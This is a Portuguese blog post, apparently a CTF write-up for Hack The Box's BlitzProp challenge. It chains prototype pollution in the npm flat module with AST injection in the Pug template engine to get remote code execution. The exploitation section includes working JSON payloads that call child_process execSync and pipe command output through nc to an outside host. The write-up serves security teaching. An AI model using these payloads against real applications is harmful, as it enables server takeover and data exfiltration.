---
layout: post
title: "BlitzProp - Cyber Apocalipse CTF 2021"
date: 2021-04-25 17:00:00 -0300
categories: CyberApocalipse
---
## Resumo

![img](/assets/BlitzProp/1.png)

BlitzProp foi um desafio do CTF Cyber Apocalipse realizado pelo Hack The Box e Crypto Hack, envolveu vulnerabilidades como Prototype Pollution, que possibilita o AST Injection permite um RCE.

## Recon
O desafio permitia o download do código fonte da aplicação, que utilizava como backend nodejs, as seguintes dependências existiam para o funcionamento da aplicação:

![img](/assets/BlitzProp/2.png)

O módulo flat permite a transformação de um objeto javascript em JSON e vice-versa. Abaixo um exemplo da função *unflatten*, utilizada na aplicação.

``` js
var unflatten = require('flat').unflatten
unflatten({
 'three.levels.deep': 42,
 'three.levels': {
 nested: true
 }
})

// {
// 		three: {
// 			levels: {
// 					deep: 42,
// 					nested: true
// 					}
// 				}
// }
```

Já a dependência Pug se trata de um *template engine*, que permite concatenar tags HTMLs junto do código javascript, para renderizar um template pré-definido.

```html
<!--
doctype html
html(lang\="en")
  head
    title\= pageTitle
    script(type\='text/javascript').
      if (foo) bar(1 + 5)
  body
    h1 Pug - node template engine
    #container.col
      if youAreUsingPug
        p You are amazing
      else
        p Get on it!
      p.
        Pug is a terse and simple templating language with a
        strong focus on performance and powerful features.
-->
 
<!-- Se torna: --> 

<!DOCTYPE html\>
<html lang\="en"\>
  <head\>
    <title\>Pug</title\>
    <script type\="text/javascript"\>
      if (foo) bar(1 + 5)
    </script\>
  </head\>
  <body\>
    <h1\>Pug - node template engine</h1\>
    <div id\="container" class\="col"\>
      <p\>You are amazing</p\>
      <p\>Pug is a terse and simple templating language with a strong focus on performance and powerful features.</p\>
    </div\>
  </body\>
</html\>
```

Como podemos visualizar no código abaixo, a aplicação recebe nosso corpo da requisição POST, aplica o *unflatten* nesta requisição e após isso compara com algumas das opções pré-definidas.
Caso a string recebida no corpo da requisição estivesse dentro da comparação, o módulo *pug* é chamado para realizar um template para a resposta.

![img](/assets/BlitzProp/3.png)

Podemos perceber que não há nenhuma função que rejeite a entrada de dados por parte da API, ou seja, ela recebe o body da requisição e acaba o processando.

## Exploitation
Como toda avaliação de segurança, após o reconhecimento da aplicação é necessário realizar o levantamento de vulnerabilidades. Conforme anotado na sessão de reconhecimento, temos as dependências *Pug* na versão **3.0.0** e a dependência *Flat* na versão **5.0.0**.
Um dos melhores sites para pesquisar por vulnerabilidades em pacotes npm é o [snik.io](https://snyk.io/vuln/npm:flat@5.0.0), procurando pela versão do flat, é possível identificar que o mesmo é vulnerável a prototype pollution.

![img](/assets/BlitzProp/4.png)

[Prototype pollution é uma vulnerabilidade que afeta o javascript, se trata da capacidade de um agente malicioso injetar propriedades dentro de objetos.](https://github.com/Kirill89/prototype-pollution-explained) O Javascript permite que todos os atributos de objetos possam ser alterados, incluindo os seus atributos principais como *\_\_proto\_\_*, *constructor* e *prototype*.

Deste modo, para verificar se o módulo da API estava realmente vulnerável, enviei uma requisição JSON alterando o atributo song.name para que retornasse sempre verdadeiro.

![img](/assets/BlitzProp/5.png)

Após esta requisição, todas as requisições para API retornam a compilação do template, comprovando a vulnerabilidade. 
Avaliando a vulnerabilidade do módulo flat, comecei a procurar por vulnerabilidades relacionadas com a dependência pug, foi onde encontrei uma [vulnerabilidade de RCE](https://snyk.io/vuln/SNYK-JS-PUG-1071616), que permite uma execução de comandos caso seja possível controlar a opção *pretty* do compilador do pug. Porém, não se encaixa na nossa aplicação pois esta opção não é utilizada.
Pesquisando um pouco mais, foi possível encontrar este excelente [artigo](https://blog.p6.is/AST-Injection/) que entrelaça a vulnerabilidade de Prototype Pollution com AST-Injection, desencadeando um RCE em mecanismos de template como o pug, mostrado no artigo.
[Abstract Syntax Trees (ASTs)](https://www.twilio.com/blog/abstract-syntax-trees) é a representação de código em árvore, são uma parte fundamental da maneira que um compilador trabalha. 
Dessa forma, podemos realizar uma injeção de AST via prototype pollution, fazendo com que o compilador execute nosso código malicioso.  
De acordo com este [artigo](https://blog.p6.is/AST-Injection/), podemos realizar a injeção do código malicioso no compilador do pug, por meio do objeto *block* realizamos a alteração de uma variável de debug chamada *pug_debug_line* com o código abaixo: 

```json
{

	"__proto__.block": {

	 "type": "Text",

	 "line": "Alterar pug_debug_line"

	}

   }

```

Enviando a requisição acima acarreta na alteração do objeto e variável do compilador do pug, fazendo com que o texto contido em "line" seja processado. Por meio dessa poluição, conseguimos injetar um código malicioso e gerar execução remota de comandos no servidor, por meio do código abaixo:

```json
{

	"__proto__.block": {

	 "type": "Text",

	 "line": "process.mainModule.require('child_process').execSync(`ls | nc [REDACTED] 12562`)"

	}

   }

```

E dessa forma conseguimos visualizar o nome da flag da challenge.

![img](/assets/BlitzProp/6.png)

Enviamos outra requisição:

```json
{

	"__proto__.block": {

	 "type": "Text",

	 "line": "process.mainModule.require('child_process').execSync(`cat flagYO1AC | nc [REDACTED] 12562`)"

	}

   }

```

E voa-lá, desafio concluído!

![img](/assets/BlitzProp/7.png)

## Considerações Finais

Podemos perceber por meio deste desafio como a vulnerabilidade de prototype pollution pode ser perigosa para muitas aplicações, pois consegue interagir diretamente com todos os objetos. Este tipo de falha começa a ficar cada vez mais comum visto a ampla adoção de frameworks javascript e typescript no mercado.